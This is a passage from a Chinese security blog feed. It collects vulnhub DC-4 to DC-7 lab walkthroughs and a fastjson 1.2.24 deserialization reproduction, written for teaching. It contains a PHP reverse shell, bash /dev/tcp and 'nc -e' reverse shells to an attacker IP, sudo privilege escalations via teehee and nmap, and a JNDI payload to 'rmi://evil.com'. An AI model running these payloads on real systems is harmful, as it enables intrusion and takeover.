class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>nc监听反弹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152133693.png"></p><p>反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>将反弹shell的命令写入最开始的backups.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148432.png"></p><p>等计划任务执行反弹一个shell回来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152148588.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-7,356/&quot;&gt;https://www.vulnhub.com/entry/dc-7,356/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.148&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vlunhub-dc6打靶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc6%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T05:40:43.000Z</published>
    <updated>2022-06-15T11:42:33.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>靶机:172.16.17.147<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫一下靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151342099.png"></p><p>访问发现被重定向<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151340350.png"></p><p>添加一个dns解析,WordPress<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151355811.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破账号"><a href="#爆破账号" class="headerlink" title="爆破账号"></a>爆破账号</h2><p>使用wpscan暴力扫出账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151425104.png"><br>根据给出的线索拿到密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151432351.png"></p><p>要注意的是这个文件是一个压缩包,需要先解压<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151437401.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151438388.png"></p><p>根据账号密码去爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151439811.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151445374.png"><br>爆破出账号密码<br>mark &#x2F; helpdesk0</p><h2 id="插件利用"><a href="#插件利用" class="headerlink" title="插件利用"></a>插件利用</h2><p>后台发现一个插件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151453588.png"></p><p>找到利用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151454374.png"></p><p>修改利用文件反弹地址为kali的地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151704922.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>kali监听,然后打开利用文件,反弹一个shell回来,再用python起一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151706659.png"></p><p>翻目录找到可以利用的点,一个可以登录的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151724387.png"></p><p>登录上去后,查看sudo运行的命令,找到一个脚本<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151731225.png"></p><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151836816.png"></p><p>继续看suid命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151839915.png"></p><p>存在nmap,可以使用nmap来提权<br>nse是nmap的插件扩展名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> os.execute(<span class="string">&#x27;/bin/bash&#x27;</span>) &gt; shell.nes</span><br><span class="line">sudo nmap --script=shell.nes</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846689.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151846069.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-6,315/&quot;&gt;https://www.vulnhub.com/entry/dc-6,315/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.147&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="WordPress" scheme="https://syst1m.top/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc5打靶</title>
    <link href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-14T11:21:37.000Z</published>
    <updated>2022-06-14T14:37:14.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>靶机:172.16.17.146<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png"></p><p>开了111端口rpcbind,百度是拒绝服务漏洞,忽略</p><p>打开网站首页,扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png"></p><p>发现一个留言板,提交看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png"><br>多次提交后发现,页脚在变化,结合扫目录时候发现一个footer.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>应该是包含了这个footer.php文件,尝试文件包含漏洞,猜一下参数名<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png"></p><p>尝试伪协议getshell,但是应该没有开启allow_url_include,默认为关闭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1?file=php://input PostData:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="尝试读取别的信息"><a href="#尝试读取别的信息" class="headerlink" title="尝试读取别的信息"></a>尝试读取别的信息</h2><p>权限很低,只能读取一下nginx的日志,因为扫过目录所以信息很多,翻到最后可以看到我们读取&#x2F;etc&#x2F;passwd的请求<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png"></p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>总结一下,现在我们有文件包含,能查看nginx日志<br>那么我是否可以构造一句话请求,让他写入日志,再利用文件包含去执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png"></p><p>这里有一个坑,请求发送之后,再去查看日志,却没有,其实已经写进去了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>反弹一个shell到kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png"></p><p>这里反弹回来的就是一个交互式shell</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>翻了翻目录,没什么东西,看看以root权限运行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png"></p><p>有一个screen<br>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p><p>kali搜索一下利用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png"></p><p>将exp复制出来用蚁剑直接写到tmp目录下<br>在root目录下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-5,314/&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.146&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="文件包含" scheme="https://syst1m.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vlunhub-dc4打靶</title>
    <link href="https://syst1m.top/2022/06/13/vulnhub-dc4%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/13/vulnhub-dc4%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-13T11:36:38.000Z</published>
    <updated>2022-06-13T12:47:00.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a><br>靶机:172.16.17.145<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131949872.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行nmap扫描<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131938943.png"><br>开放22和80端口</p><p>打开网站首页是一个登录框<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131942760.png"></p><p>扫描目录,没什么收获<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131938888.png"></p><p>回到登录,没有验证码也没有token,尝试爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131937353.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131937509.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>登录看到,command敏感字,继续跟进<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131944821.png"></p><p>明显的命令执行,抓包分析<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131945003.png"></p><p>成功执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131947263.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>反弹一个shell到kali看看 ,nc监听本地4444端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131949018.png"></p><p>反弹成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 172.16.17.140 4444</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131959946.png"></p><p>利用python反弹一个交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132003636.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>翻翻目录,在家目录翻到一些文件,发现疑似密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132013881.png"></p><p>复制出来构造账号为家目录的几个文件夹名,密码为passwords.bak文件里的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132019075.png"></p><p>用hydra爆破出账号密码  jim&#x2F;jibril04<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132030300.png"></p><p>登录,一顿翻发现有邮件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132034541.png"></p><p>在&#x2F;var&#x2F;spool&#x2F;mail下翻到邮件,找到Charles的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132035868.png"></p><p>尝试登录,发现没有这个用户<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132036751.png"><br>切换一下小写成功登录,查看一下sudo 运行的命令有一个teehee<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132043031.png"></p><p>使用teehee命令提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html$ <span class="built_in">echo</span> <span class="string">&quot;ceshi::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>提权到 root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132046393.png"></p><p>找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206132046070.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-4,313/&quot;&gt;https://www.vulnhub.com/entry/dc-4,313/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.145&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206131949872.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="drupal7" scheme="https://syst1m.top/tags/drupal7/"/>
    
    <category term="提权" scheme="https://syst1m.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>fastjson1.2.24反序列化漏洞复现</title>
    <link href="https://syst1m.top/2022/06/13/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/13/fastjson1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-13T07:42:41.000Z</published>
    <updated>2022-06-13T11:55:33.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>CVE-2017-18349<br>fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。<br>根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>vulhub项目 <a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131547498.png"></p><p>向服务器post一个json对象,即可更新服务端信息<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131555028.png"></p><p>因为目标环境是 Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl的利用链，借助 JNDI 注入来执行命令。<br>首先编译并上传命令执行代码，如 <a href="http://x.x.x.x:8989/TouchFile.class%EF%BC%9A">http://x.x.x.x:8989/TouchFile.class：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131559623.png"></p><p>需要注意的是:<br>String commands 在部分环境下需要添加 bash -c ,否则无法执行命令。<br>如果没有 web 服务，其实可以通过 php -S 0.0.0.0: port或者 python -m SimpleHTTPServer port临时搭建一个 web 服务器，其发布目录即当前执行目录。</p><h2 id="有外网VPS"><a href="#有外网VPS" class="headerlink" title="有外网VPS"></a>有外网VPS</h2><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec项目</a>启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 TouchFile.class<br>也可以使用打包好的jar包<a href="https://github.com/zhzyker/exphub/blob/master/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar">项目地址</a></p><p>将生成的 marshalsec-0.0.3-SNAPSHOT-all.jar包部署到公网的一台 VPS 上，执行如下脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://x.x.x.x:port/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>发送如下数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8090</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>160</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://evil.com:9999/TouchFile&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="无外网VPS"><a href="#无外网VPS" class="headerlink" title="无外网VPS"></a>无外网VPS</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>使用kali当vps主机</p><p>先构造恶意代码,并编译<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131846179.png"></p><p>再使用python起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206131847211.png"></p><p>接着启动一个RMI服务器，设置监听端口，并制定加载远程类TouchFile.class,ip为http服务的ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar 